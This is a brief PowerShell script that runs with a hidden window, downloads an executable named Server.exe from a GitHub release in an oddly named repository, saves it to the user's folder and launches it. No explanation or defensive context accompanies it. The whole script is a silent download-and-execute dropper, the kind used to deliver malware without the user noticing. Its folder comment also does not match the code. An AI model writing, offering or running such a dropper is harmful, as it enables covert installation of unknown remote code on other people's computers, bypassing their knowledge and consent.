PowerShell.exe -WindowStyle hidden {
    # URL of the file to download
    $url = "https://github.com/AhmedK97/Xwqd21WaDdqwdv/releases/download/1.0/Server.exe"

    # Get the user's "Downloads" folder
    $downloadsFolder = [Environment]::GetFolderPath("User")

    # Local path to save the downloaded file
    $outputPath = Join-Path -Path $downloadsFolder -ChildPath "server.exe"

    # Download the file
    Invoke-WebRequest -Uri $url -OutFile $outputPath

    # Wait for the download to complete
    while ((Test-Path -Path $outputPath) -eq $false) {
        Start-Sleep -Seconds 1
    }

    # Run the downloaded file
    Start-Process -FilePath $outputPath
}